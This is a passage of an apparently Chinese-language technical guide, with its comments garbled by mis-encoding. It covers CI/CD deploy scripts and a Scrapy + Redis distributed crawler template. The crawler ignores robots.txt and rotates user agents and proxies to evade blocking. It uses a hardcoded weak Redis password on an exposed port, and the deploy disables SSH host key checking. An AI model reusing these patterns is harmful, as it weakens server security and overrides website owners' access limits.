                        ssh -o StrictHostKeyChecking=no user@production-host &quot;
                            cd /opt/scraper &amp;&amp;
                            docker-compose pull &amp;&amp;
                            docker-compose up -d &amp;&amp;
                            docker-compose ps
                        &quot;
                    '''
                }
            }
        }
    }

    post {
        always {
            cleanWs()
        }
        success {
            slackSend(
                color: 'good',
                message: &quot;âœ… Build ${env.JOB_NAME} #${env.BUILD_NUMBER} succeeded&quot;
            )
        }
        failure {
            slackSend(
                color: 'danger',
                message: &quot;âŒ Build ${env.JOB_NAME} #${env.BUILD_NUMBER} failed&quot;
            )
        }
    }
}
</code></pre>
<hr />
<h2>è¾…åŠ©è„šæœ¬</h2>
<h3>scripts/run_tests.sh</h3>
<pre><code class="language-bash">#!/bin/bash
set -e

echo &quot;ğŸ§ª Running tests...&quot;

# æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ
source venv/bin/activate

# è¿è¡Œæµ‹è¯•
pytest tests/ \
    --cov=app \
    --cov-report=xml \
    --cov-report=html \
    --cov-report=term \
    --junitxml=junit.xml \
    -v

echo &quot;âœ… Tests completed!&quot;
</code></pre>
<h3>scripts/build.sh</h3>
<pre><code class="language-bash">#!/bin/bash
set -e

echo &quot;ğŸ—ï¸ Building Docker image...&quot;

# è·å– Git ä¿¡æ¯
GIT_COMMIT=$(git rev-parse --short HEAD)
GIT_BRANCH=$(git rev-parse --abbrev-ref HEAD)
BUILD_DATE=$(date -u +&quot;%Y-%m-%dT%H:%M:%SZ&quot;)

# æ„å»ºé•œåƒ
docker build \
    --build-arg GIT_COMMIT=$GIT_COMMIT \
    --build-arg GIT_BRANCH=$GIT_BRANCH \
    --build-arg BUILD_DATE=$BUILD_DATE \
    -t scraper:$GIT_COMMIT \
    -t scraper:latest \
    -f docker/Dockerfile \
    .

echo &quot;âœ… Build completed!&quot;
echo &quot;Image tags: scraper:$GIT_COMMIT, scraper:latest&quot;
</code></pre>
<h3>scripts/deploy.sh</h3>
<pre><code class="language-bash">#!/bin/bash
set -e

ENVIRONMENT=${1:-staging}

echo &quot;ğŸš€ Deploying to $ENVIRONMENT...&quot;

case $ENVIRONMENT in
  staging)
    HOST=$STAGING_HOST
    USER=$STAGING_USER
    ;;
  production)
    HOST=$PRODUCTION_HOST
    USER=$PRODUCTION_USER
    read -p &quot;âš ï¸  Deploy to PRODUCTION? (yes/no) &quot; -n 3 -r
    echo
    if [[ ! $REPLY =~ ^yes$ ]]; then
        echo &quot;Deployment cancelled&quot;
        exit 1
    fi
    ;;
  *)
    echo &quot;Unknown environment: $ENVIRONMENT&quot;
    exit 1
    ;;
esac

# éƒ¨ç½²
ssh $USER@$HOST &lt;&lt; 'EOF'
  cd /opt/scraper
  docker-compose pull
  docker-compose up -d
  docker-compose ps
  echo &quot;âœ… Deployment completed!&quot;
EOF

# å¥åº·æ£€æŸ¥
echo &quot;ğŸ¥ Running health check...&quot;
sleep 10
if curl -f http://$HOST/health; then
    echo &quot;âœ… Health check passed!&quot;
else
    echo &quot;âŒ Health check failed!&quot;
    exit 1
fi
</code></pre>
<hr />
<h2>ğŸ“š é…ç½®è¯´æ˜</h2>
<h3>GitHub Secrets é…ç½®</h3>
<p>éœ€è¦åœ¨ GitHub ä»“åº“è®¾ç½®ä»¥ä¸‹ Secrets:</p>
<pre><code>DOCKER_USERNAME       # Docker Hub ç”¨æˆ·å
DOCKER_PASSWORD       # Docker Hub å¯†ç 
SSH_PRIVATE_KEY       # SSH ç§é’¥
SSH_USER              # SSH ç”¨æˆ·å
SSH_HOST              # æœåŠ¡å™¨åœ°å€
SLACK_WEBHOOK         # Slack é€šçŸ¥ Webhook
</code></pre>
<h3>GitLab CI/CD Variables</h3>
<p>éœ€è¦åœ¨ GitLab é¡¹ç›®è®¾ç½®ä»¥ä¸‹å˜é‡:</p>
<pre><code>SSH_PRIVATE_KEY       # SSH ç§é’¥
SSH_USER              # SSH ç”¨æˆ·å
STAGING_HOST          # æµ‹è¯•ç¯å¢ƒåœ°å€
PRODUCTION_HOST       # ç”Ÿäº§ç¯å¢ƒåœ°å€
</code></pre>
<h3>Jenkins å‡­æ®</h3>
<p>éœ€è¦åœ¨ Jenkins é…ç½®ä»¥ä¸‹å‡­æ®:</p>
<ul>
<li><code>docker-hub-credentials</code>: Docker Hub ç”¨æˆ·åå’Œå¯†ç </li>
<li><code>ssh-credentials</code>: SSH ç§é’¥</li>
</ul>
<hr />
<h2>ğŸ“Š æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>åˆ†æ”¯ç­–ç•¥</strong>: ä½¿ç”¨ GitFlow æˆ– GitHub Flow</li>
<li><strong>ä»£ç å®¡æŸ¥</strong>: æ‰€æœ‰ PR å¿…é¡»é€šè¿‡ CI æ£€æŸ¥</li>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong>: ä¿æŒæµ‹è¯•è¦†ç›–ç‡ &gt; 80%</li>
<li><strong>å®‰å…¨æ‰«æ</strong>: å®šæœŸæ£€æŸ¥ä¾èµ–æ¼æ´</li>
<li><strong>ç‰ˆæœ¬ç®¡ç†</strong>: ä½¿ç”¨è¯­ä¹‰åŒ–ç‰ˆæœ¬</li>
<li><strong>å›æ»šæœºåˆ¶</strong>: ä¿ç•™æœ€è¿‘ 5 ä¸ªç‰ˆæœ¬çš„é•œåƒ</li>
</ol>
<hr />
<h2>ğŸ”— ç›¸å…³èµ„æº</h2>
<ul>
<li><a href="#section-71">Docker éƒ¨ç½²</a></li>
<li><a href="#section-56">ç›‘æ§å‘Šè­¦</a></li>
<li><a href="https://docs.github.com/actions">GitHub Actions æ–‡æ¡£</a></li>
<li><a href="https://docs.gitlab.com/ee/ci/">GitLab CI æ–‡æ¡£</a></li>
<li><a href="https://www.jenkins.io/doc/">Jenkins æ–‡æ¡£</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-73">
                                                <h2>[R72] Distributed Crawler</h2>
                                                <h1>R72: åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„æ¨¡æ¿</h1>
<p>åŸºäº Scrapy + Redis çš„åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„ï¼Œæ”¯æŒå¤šæœºååŒã€ä»»åŠ¡è°ƒåº¦å’Œæ•°æ®å»é‡ã€‚</p>
<hr />
<h2>ğŸ“ é¡¹ç›®ç»“æ„</h2>
<pre><code>distributed_crawler/
â”œâ”€â”€ scrapy_project/
â”‚   â”œâ”€â”€ scrapy.cfg
â”‚   â”œâ”€â”€ spiders/
â”‚   â”‚   â”œâ”€â”€ __init__.py
â”‚   â”‚   â”œâ”€â”€ base_spider.py
â”‚   â”‚   â””â”€â”€ target_spider.py
â”‚   â”œâ”€â”€ items.py
â”‚   â”œâ”€â”€ pipelines.py
â”‚   â”œâ”€â”€ middlewares.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ utils/
â”‚       â”œâ”€â”€ __init__.py
â”‚       â”œâ”€â”€ redis_client.py
â”‚       â””â”€â”€ bloomfilter.py
â”œâ”€â”€ scheduler/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ task_manager.py
â”‚   â””â”€â”€ url_scheduler.py
â”œâ”€â”€ config/
â”‚   â”œâ”€â”€ __init__.py
â”‚   â”œâ”€â”€ settings.py
â”‚   â””â”€â”€ redis_config.py
â”œâ”€â”€ docker/
â”‚   â”œâ”€â”€ Dockerfile.spider
â”‚   â”œâ”€â”€ Dockerfile.scheduler
â”‚   â””â”€â”€ docker-compose.yml
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ start_spider.sh
â”‚   â”œâ”€â”€ add_tasks.py
â”‚   â””â”€â”€ monitor.py
â”œâ”€â”€ tests/
â”‚   â””â”€â”€ test_spider.py
â”œâ”€â”€ requirements.txt
â””â”€â”€ README.md
</code></pre>
<hr />
<h2>ğŸ“„ æ ¸å¿ƒæ–‡ä»¶</h2>
<h3>1. scrapy_project/settings.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
Scrapy åˆ†å¸ƒå¼é…ç½®
&quot;&quot;&quot;
import os
from dotenv import load_dotenv

load_dotenv()

# Scrapy åŸºç¡€é…ç½®
BOT_NAME = 'distributed_crawler'
SPIDER_MODULES = ['scrapy_project.spiders']
NEWSPIDER_MODULE = 'scrapy_project.spiders'

# éµå®ˆ robots.txt
ROBOTSTXT_OBEY = False

# å¹¶å‘é…ç½®
CONCURRENT_REQUESTS = 16
CONCURRENT_REQUESTS_PER_DOMAIN = 8
CONCURRENT_REQUESTS_PER_IP = 8

# ä¸‹è½½å»¶è¿Ÿ
DOWNLOAD_DELAY = 1
RANDOMIZE_DOWNLOAD_DELAY = True

# è¶…æ—¶è®¾ç½®
DOWNLOAD_TIMEOUT = 30
RETRY_TIMES = 3
RETRY_HTTP_CODES = [500, 502, 503, 504, 408, 429]

# User-Agent
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

# è¯·æ±‚å¤´
DEFAULT_REQUEST_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
}

# ==================== Redis é…ç½® ====================

# ä½¿ç”¨ scrapy-redis
SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;
DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;
SCHEDULER_PERSIST = True  # ä¿æŒè°ƒåº¦é˜Ÿåˆ—

# Redis è¿æ¥
REDIS_HOST = os.getenv('REDIS_HOST', 'localhost')
REDIS_PORT = int(os.getenv('REDIS_PORT', 6379))
REDIS_PASSWORD = os.getenv('REDIS_PASSWORD', '')
REDIS_DB = int(os.getenv('REDIS_DB', 0))

# Redis è¿æ¥é…ç½®
REDIS_PARAMS = {
    'password': REDIS_PASSWORD,
    'db': REDIS_DB,
    'decode_responses': False,  # å…³é”®ï¼šä¸è‡ªåŠ¨è§£ç 
}

# è°ƒåº¦é˜Ÿåˆ— key å‰ç¼€
SCHEDULER_QUEUE_KEY = '%(spider)s:requests'
SCHEDULER_DUPEFILTER_KEY = '%(spider)s:dupefilter'

# ==================== ä¸­é—´ä»¶ ====================

DOWNLOADER_MIDDLEWARES = {
    # é‡è¯•ä¸­é—´ä»¶
    'scrapy.downloadermiddlewares.retry.RetryMiddleware': 90,

    # Redis ç»Ÿè®¡ä¸­é—´ä»¶
    'scrapy_redis.downloadermiddleware.RedisStatsMiddleware': 100,

    # éšæœº User-Agent
    'scrapy_project.middlewares.RandomUserAgentMiddleware': 400,

    # ä»£ç†ä¸­é—´ä»¶
    'scrapy_project.middlewares.ProxyMiddleware': 410,

    # å¼‚å¸¸æ•è·
    'scrapy_project.middlewares.ExceptionMiddleware': 500,
}

SPIDER_MIDDLEWARES = {
    'scrapy_redis.spidermiddleware.RedisSrpiderMiddleware': 100,
}

# ==================== Pipeline ====================

ITEM_PIPELINES = {
    # æ•°æ®æ¸…æ´—
    'scrapy_project.pipelines.CleanPipeline': 100,

    # å»é‡æ£€æŸ¥
    'scrapy_project.pipelines.DuplicatesPipeline': 200,

    # MongoDB å­˜å‚¨
    'scrapy_project.pipelines.MongoPipeline': 300,

    # Redis ç¼“å­˜
    'scrapy_project.pipelines.RedisPipeline': 400,
}

# ==================== MongoDB é…ç½® ====================

MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
MONGODB_DATABASE = os.getenv('MONGODB_DB', 'scraper_db')
MONGODB_COLLECTION = '%(spider)s_items'

# ==================== æ—¥å¿—é…ç½® ====================

LOG_LEVEL = 'INFO'
LOG_FORMAT = '%(asctime)s [%(name)s] %(levelname)s: %(message)s'
LOG_DATEFORMAT = '%Y-%m-%d %H:%M:%S'

# ==================== å…¶ä»–é…ç½® ====================

# è‡ªåŠ¨é™é€Ÿ
AUTOTHROTTLE_ENABLED = True
AUTOTHROTTLE_START_DELAY = 1
AUTOTHROTTLE_MAX_DELAY = 10
AUTOTHROTTLE_TARGET_CONCURRENCY = 2.0

# Cookies
COOKIES_ENABLED = True
COOKIES_DEBUG = False

# Telnet æ§åˆ¶å°
TELNETCONSOLE_ENABLED = True
TELNETCONSOLE_PORT = [6023, 6024, 6025]
</code></pre>
<h3>2. scrapy_project/items.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
æ•°æ®æ¨¡å‹å®šä¹‰
&quot;&quot;&quot;
import scrapy
from scrapy.loader.processors import TakeFirst, MapCompose, Join
from w3lib.html import remove_tags


def clean_text(text):
    &quot;&quot;&quot;æ¸…ç†æ–‡æœ¬&quot;&quot;&quot;
    return text.strip() if text else ''


class BaseItem(scrapy.Item):
    &quot;&quot;&quot;åŸºç¡€ Item&quot;&quot;&quot;
    # é€šç”¨å­—æ®µ
    url = scrapy.Field(output_processor=TakeFirst())
    spider_name = scrapy.Field(output_processor=TakeFirst())
    crawl_time = scrapy.Field(output_processor=TakeFirst())


class ProductItem(BaseItem):
    &quot;&quot;&quot;å•†å“ Item&quot;&quot;&quot;
    title = scrapy.Field(
        input_processor=MapCompose(remove_tags, clean_text),
        output_processor=TakeFirst()
    )
    price = scrapy.Field(output_processor=TakeFirst())
    stock = scrapy.Field(output_processor=TakeFirst())
    description = scrapy.Field(
        input_processor=MapCompose(remove_tags, clean_text),
        output_processor=Join('\n')
    )
    images = scrapy.Field()
    tags = scrapy.Field()
    rating = scrapy.Field(output_processor=TakeFirst())
    reviews_count = scrapy.Field(output_processor=TakeFirst())


class ArticleItem(BaseItem):
    &quot;&quot;&quot;æ–‡ç«  Item&quot;&quot;&quot;
    title = scrapy.Field(
        input_processor=MapCompose(remove_tags, clean_text),
        output_processor=TakeFirst()
    )
    author = scrapy.Field(output_processor=TakeFirst())
    publish_time = scrapy.Field(output_processor=TakeFirst())
    content = scrapy.Field(
        input_processor=MapCompose(remove_tags, clean_text),
        output_processor=Join('\n')
    )
    category = scrapy.Field()
    tags = scrapy.Field()
    view_count = scrapy.Field(output_processor=TakeFirst())
</code></pre>
<h3>3. scrapy_project/pipelines.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
æ•°æ®å¤„ç† Pipeline
&quot;&quot;&quot;
import hashlib
import pymongo
import redis
from datetime import datetime
from itemadapter import ItemAdapter
from scrapy.exceptions import DropItem


class CleanPipeline:
    &quot;&quot;&quot;æ•°æ®æ¸…æ´— Pipeline&quot;&quot;&quot;

    def process_item(self, item, spider):
        adapter = ItemAdapter(item)

        # æ·»åŠ çˆ¬å–æ—¶é—´
        adapter['crawl_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        adapter['spider_name'] = spider.name

        # æ¸…ç†ç©ºå€¼
        for field in adapter.field_names():
            value = adapter.get(field)
            if value is None or value == '':
                adapter[field] = None

        return item


class DuplicatesPipeline:
    &quot;&quot;&quot;å»é‡ Pipeline (åŸºäº Redis)&quot;&quot;&quot;

    def __init__(self, redis_host, redis_port, redis_password, redis_db):
        self.redis_host = redis_host
        self.redis_port = redis_port
        self.redis_password = redis_password
        self.redis_db = redis_db
        self.redis_client = None

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            redis_host=crawler.settings.get('REDIS_HOST'),
            redis_port=crawler.settings.get('REDIS_PORT'),
            redis_password=crawler.settings.get('REDIS_PASSWORD'),
            redis_db=crawler.settings.get('REDIS_DB'),
        )

    def open_spider(self, spider):
        self.redis_client = redis.Redis(
            host=self.redis_host,
            port=self.redis_port,
            password=self.redis_password,
            db=self.redis_db,
            decode_responses=True
        )

    def close_spider(self, spider):
        if self.redis_client:
            self.redis_client.close()

    def process_item(self, item, spider):
        adapter = ItemAdapter(item)

        # ç”Ÿæˆå”¯ä¸€æ ‡è¯†
        url = adapter.get('url', '')
        item_hash = hashlib.md5(url.encode()).hexdigest()

        # æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨
        key = f&quot;{spider.name}:items:{item_hash}&quot;
        if self.redis_client.exists(key):
            raise DropItem(f&quot;Duplicate item found: {url}&quot;)

        # æ ‡è®°å·²å¤„ç†
        self.redis_client.setex(key, 86400 * 7, '1')  # ä¿ç•™7å¤©

        return item


class MongoPipeline:
    &quot;&quot;&quot;MongoDB å­˜å‚¨ Pipeline&quot;&quot;&quot;

    def __init__(self, mongo_uri, mongo_db):
        self.mongo_uri = mongo_uri
        self.mongo_db = mongo_db
        self.client = None
        self.db = None

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            mongo_uri=crawler.settings.get('MONGODB_URI'),
            mongo_db=crawler.settings.get('MONGODB_DATABASE')
        )

    def open_spider(self, spider):
        self.client = pymongo.MongoClient(self.mongo_uri)
        self.db = self.client[self.mongo_db]

    def close_spider(self, spider):
        if self.client:
            self.client.close()

    def process_item(self, item, spider):
        collection_name = f&quot;{spider.name}_items&quot;
        collection = self.db[collection_name]

        # æ’å…¥æ•°æ®
        item_dict = ItemAdapter(item).asdict()
        collection.insert_one(item_dict)

        spider.logger.info(f&quot;Item saved to MongoDB: {item_dict.get('url')}&quot;)
        return item


class RedisPipeline:
    &quot;&quot;&quot;Redis ç¼“å­˜ Pipeline&quot;&quot;&quot;

    def __init__(self, redis_host, redis_port, redis_password, redis_db):
        self.redis_host = redis_host
        self.redis_port = redis_port
        self.redis_password = redis_password
        self.redis_db = redis_db
        self.redis_client = None

    @classmethod
    def from_crawler(cls, crawler):
        return cls(
            redis_host=crawler.settings.get('REDIS_HOST'),
            redis_port=crawler.settings.get('REDIS_PORT'),
            redis_password=crawler.settings.get('REDIS_PASSWORD'),
            redis_db=crawler.settings.get('REDIS_DB') + 1,  # ä½¿ç”¨ä¸åŒçš„ DB
        )

    def open_spider(self, spider):
        self.redis_client = redis.Redis(
            host=self.redis_host,
            port=self.redis_port,
            password=self.redis_password,
            db=self.redis_db,
            decode_responses=True
        )

    def close_spider(self, spider):
        if self.redis_client:
            self.redis_client.close()

    def process_item(self, item, spider):
        import json

        adapter = ItemAdapter(item)
        url = adapter.get('url', '')
        item_hash = hashlib.md5(url.encode()).hexdigest()

        # ç¼“å­˜åˆ° Redis
        key = f&quot;{spider.name}:cache:{item_hash}&quot;
        value = json.dumps(adapter.asdict(), ensure_ascii=False)
        self.redis_client.setex(key, 3600, value)  # ç¼“å­˜1å°æ—¶

        return item
</code></pre>
<h3>4. scrapy_project/middlewares.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
ä¸­é—´ä»¶
&quot;&quot;&quot;
import random
from scrapy import signals
from scrapy.downloadermiddlewares.useragent import UserAgentMiddleware
from scrapy.exceptions import IgnoreRequest


class RandomUserAgentMiddleware(UserAgentMiddleware):
    &quot;&quot;&quot;éšæœº User-Agent ä¸­é—´ä»¶&quot;&quot;&quot;

    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    ]

    def process_request(self, request, spider):
        user_agent = random.choice(self.USER_AGENTS)
        request.headers['User-Agent'] = user_agent


class ProxyMiddleware:
    &quot;&quot;&quot;ä»£ç†ä¸­é—´ä»¶&quot;&quot;&quot;

    def __init__(self, proxy_list):
        self.proxy_list = proxy_list

    @classmethod
    def from_crawler(cls, crawler):
        # ä»é…ç½®æˆ– Redis è·å–ä»£ç†åˆ—è¡¨
        proxy_list = crawler.settings.get('PROXY_LIST', [])
        return cls(proxy_list)

    def process_request(self, request, spider):
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            request.meta['proxy'] = proxy
            spider.logger.debug(f&quot;Using proxy: {proxy}&quot;)

    def process_exception(self, request, exception, spider):
        # ä»£ç†å¤±è´¥æ—¶ï¼Œç§»é™¤è¯¥ä»£ç†
        proxy = request.meta.get('proxy')
        if proxy and proxy in self.proxy_list:
            self.proxy_list.remove(proxy)
            spider.logger.warning(f&quot;Removed failed proxy: {proxy}&quot;)


class ExceptionMiddleware:
    &quot;&quot;&quot;å¼‚å¸¸å¤„ç†ä¸­é—´ä»¶&quot;&quot;&quot;

    def process_response(self, request, response, spider):
        # æ£€æŸ¥å“åº”çŠ¶æ€ç 
        if response.status in [403, 429]:
            spider.logger.warning(f&quot;Rate limited or blocked: {response.url}&quot;)
            # å¯ä»¥åœ¨è¿™é‡Œå®ç°å»¶è¿Ÿé‡è¯•é€»è¾‘

        return response

    def process_exception(self, request, exception, spider):
        spider.logger.error(f&quot;Request failed: {request.url} - {exception}&quot;)
</code></pre>
<h3>5. scrapy_project/spiders/base_spider.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
åŸºç¡€çˆ¬è™«ç±»
&quot;&quot;&quot;
from scrapy_redis.spiders import RedisSpider
from scrapy.loader import ItemLoader


class BaseRedisSpider(RedisSpider):
    &quot;&quot;&quot;åŸºç¡€ Redis çˆ¬è™«&quot;&quot;&quot;

    # Redis key (éœ€è¦åœ¨å­ç±»ä¸­è¦†ç›–)
    redis_key = None

    # æ‰¹å¤„ç†å¤§å°
    redis_batch_size = 10

    # æœ€å¤§ç©ºé—²æ—¶é—´ (ç§’)
    max_idle_time = 60

    def make_request_from_data(self, data):
        &quot;&quot;&quot;
        ä» Redis è·å–çš„æ•°æ®åˆ›å»ºè¯·æ±‚

        Args:
            data: ä» Redis è·å–çš„ URL æˆ–æ•°æ®

        Returns:
            Request å¯¹è±¡
        &quot;&quot;&quot;
        url = data.decode('utf-8') if isinstance(data, bytes) else data
        return self.make_requests_from_url(url)

    def parse(self, response):
        &quot;&quot;&quot;éœ€è¦åœ¨å­ç±»ä¸­å®ç°&quot;&quot;&quot;
        raise NotImplementedError

    def get_item_loader(self, item_class, response):
        &quot;&quot;&quot;åˆ›å»º ItemLoader&quot;&quot;&quot;
        loader = ItemLoader(item=item_class(), response=response)
        loader.add_value('url', response.url)
        return loader
</code></pre>
<h3>6. scrapy_project/spiders/target_spider.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
ç›®æ ‡ç½‘ç«™çˆ¬è™«
&quot;&quot;&quot;
from scrapy import Request
from .base_spider import BaseRedisSpider
from scrapy_project.items import ProductItem


class TargetSpider(BaseRedisSpider):
    &quot;&quot;&quot;ç›®æ ‡ç½‘ç«™çˆ¬è™«&quot;&quot;&quot;

    name = 'target_spider'
    redis_key = 'target_spider:start_urls'

    custom_settings = {
        'CONCURRENT_REQUESTS': 8,
        'DOWNLOAD_DELAY': 2,
    }

    def parse(self, response):
        &quot;&quot;&quot;
        è§£æåˆ—è¡¨é¡µ
        &quot;&quot;&quot;
        # æå–äº§å“é“¾æ¥
        for href in response.css('.product-item a::attr(href)').getall():
            url = response.urljoin(href)
            yield Request(url, callback=self.parse_detail)

        # ç¿»é¡µ
        next_page = response.css('.pagination .next::attr(href)').get()
        if next_page:
            yield Request(response.urljoin(next_page), callback=self.parse)

    def parse_detail(self, response):
        &quot;&quot;&quot;
        è§£æè¯¦æƒ…é¡µ
        &quot;&quot;&quot;
        loader = self.get_item_loader(ProductItem, response)

        # æå–å­—æ®µ
        loader.add_css('title', 'h1.product-title::text')
        loader.add_css('price', '.price::text')
        loader.add_css('stock', '.stock::text')
        loader.add_css('description', '.description *::text')
        loader.add_css('images', '.product-images img::attr(src)')
        loader.add_css('tags', '.tags a::text')
        loader.add_css('rating', '.rating::attr(data-rating)')
        loader.add_css('reviews_count', '.reviews-count::text')

        yield loader.load_item()
</code></pre>
<h3>7. scheduler/task_manager.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
ä»»åŠ¡ç®¡ç†å™¨
&quot;&quot;&quot;
import redis
import logging


class TaskManager:
    &quot;&quot;&quot;åˆ†å¸ƒå¼ä»»åŠ¡ç®¡ç†å™¨&quot;&quot;&quot;

    def __init__(self, redis_host='localhost', redis_port=6379, redis_password='', redis_db=0):
        self.redis_client = redis.Redis(
            host=redis_host,
            port=redis_port,
            password=redis_password,
            db=redis_db,
            decode_responses=True
        )
        self.logger = logging.getLogger(__name__)

    def add_start_urls(self, spider_name, urls):
        &quot;&quot;&quot;
        æ·»åŠ èµ·å§‹ URL åˆ° Redis

        Args:
            spider_name: çˆ¬è™«åç§°
            urls: URL åˆ—è¡¨
        &quot;&quot;&quot;
        key = f&quot;{spider_name}:start_urls&quot;

        if isinstance(urls, str):
            urls = [urls]

        added = self.redis_client.lpush(key, *urls)
        self.logger.info(f&quot;Added {added} URLs to {key}&quot;)
        return added

    def get_queue_size(self, spider_name):
        &quot;&quot;&quot;è·å–é˜Ÿåˆ—å¤§å°&quot;&quot;&quot;
        key = f&quot;{spider_name}:start_urls&quot;
        return self.redis_client.llen(key)

    def clear_queue(self, spider_name):
        &quot;&quot;&quot;æ¸…ç©ºé˜Ÿåˆ—&quot;&quot;&quot;
        key = f&quot;{spider_name}:start_urls&quot;
        deleted = self.redis_client.delete(key)
        self.logger.info(f&quot;Cleared queue: {key}&quot;)
        return deleted

    def get_stats(self, spider_name):
        &quot;&quot;&quot;è·å–ç»Ÿè®¡ä¿¡æ¯&quot;&quot;&quot;
        stats = {
            'queue_size': self.get_queue_size(spider_name),
            'items_count': self.redis_client.scard(f&quot;{spider_name}:dupefilter&quot;),
        }
        return stats


if __name__ == '__main__':
    # ä½¿ç”¨ç¤ºä¾‹
    logging.basicConfig(level=logging.INFO)

    manager = TaskManager(
        redis_host='localhost',
        redis_port=6379,
        redis_password='redis123'
    )

    # æ·»åŠ èµ·å§‹ URL
    urls = [
        'https://example.com/page/1',
        'https://example.com/page/2',
        'https://example.com/page/3',
    ]

    manager.add_start_urls('target_spider', urls)

    # æŸ¥çœ‹ç»Ÿè®¡
    stats = manager.get_stats('target_spider')
    print(f&quot;Stats: {stats}&quot;)
</code></pre>
<h3>8. scripts/add_tasks.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
æ‰¹é‡æ·»åŠ ä»»åŠ¡è„šæœ¬
&quot;&quot;&quot;
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from scheduler.task_manager import TaskManager
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)


def generate_urls(base_url, start_page, end_page):
    &quot;&quot;&quot;ç”Ÿæˆ URL åˆ—è¡¨&quot;&quot;&quot;
    return [f&quot;{base_url}?page={i}&quot; for i in range(start_page, end_page + 1)]


def main():
    manager = TaskManager(
        redis_host='localhost',
        redis_port=6379,
        redis_password='redis123'
    )

    # ç”Ÿæˆ URL
    urls = generate_urls(
        base_url='https://example.com/products',
        start_page=1,
        end_page=100
    )

    # æ·»åŠ åˆ°é˜Ÿåˆ—
    manager.add_start_urls('target_spider', urls)

    # æŸ¥çœ‹ç»Ÿè®¡
    stats = manager.get_stats('target_spider')
    print(f&quot;\nâœ… Tasks added successfully!&quot;)
    print(f&quot;ğŸ“Š Queue size: {stats['queue_size']}&quot;)


if __name__ == '__main__':
    main()
</code></pre>
<h3>9. scripts/monitor.py</h3>
<pre><code class="language-python">&quot;&quot;&quot;
çˆ¬è™«ç›‘æ§è„šæœ¬
&quot;&quot;&quot;
import sys
import os
import time
import redis

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


class CrawlerMonitor:
    &quot;&quot;&quot;çˆ¬è™«ç›‘æ§&quot;&quot;&quot;

    def __init__(self, redis_host='localhost', redis_port=6379, redis_password='', redis_db=0):
        self.redis_client = redis.Redis(
            host=redis_host,
            port=redis_port,
            password=redis_password,
            db=redis_db,
            decode_responses=True
        )

    def get_spider_stats(self, spider_name):
        &quot;&quot;&quot;è·å–çˆ¬è™«ç»Ÿè®¡ä¿¡æ¯&quot;&quot;&quot;
        stats = {}

        # é˜Ÿåˆ—å¤§å°
        queue_key = f&quot;{spider_name}:requests&quot;
        stats['queue_size'] = self.redis_client.llen(queue_key)

        # å»é‡é›†åˆå¤§å°
        dupefilter_key = f&quot;{spider_name}:dupefilter&quot;
        stats['processed_urls'] = self.redis_client.scard(dupefilter_key)

        # ç¼“å­˜æ•°é‡
        cache_pattern = f&quot;{spider_name}:cache:*&quot;
        stats['cached_items'] = len(self.redis_client.keys(cache_pattern))

        return stats

    def monitor(self, spider_name, interval=5):
        &quot;&quot;&quot;
        æŒç»­ç›‘æ§

        Args:
            spider_name: çˆ¬è™«åç§°
            interval: åˆ·æ–°é—´éš”ï¼ˆç§’ï¼‰
        &quot;&quot;&quot;
        print(f&quot;ğŸ” Monitoring {spider_name}... (Press Ctrl+C to stop)\n&quot;)

        try:
            while True:
                stats = self.get_spider_stats(spider_name)

                print(f&quot;\rğŸ“Š Queue: {stats['queue_size']:&gt;6} | &quot;
                      f&quot;Processed: {stats['processed_urls']:&gt;8} | &quot;
                      f&quot;Cached: {stats['cached_items']:&gt;6}&quot;,
                      end='', flush=True)

                time.sleep(interval)

        except KeyboardInterrupt:
            print(&quot;\n\nâœ… Monitoring stopped&quot;)


if __name__ == '__main__':
    monitor = CrawlerMonitor(
        redis_host='localhost',
        redis_port=6379,
        redis_password='redis123'
    )

    monitor.monitor('target_spider', interval=2)
</code></pre>
<h3>10. docker/docker-compose.yml</h3>
<pre><code class="language-yaml">version: &quot;3.8&quot;

services:
  # Redis
  redis:
    image: redis:7-alpine
    container_name: crawler_redis
    command: redis-server --requirepass redis123 --maxmemory 512mb
    ports:
      - &quot;6379:6379&quot;
    volumes:
      - redis_data:/data
    networks:
      - crawler_network

  # MongoDB
  mongodb:
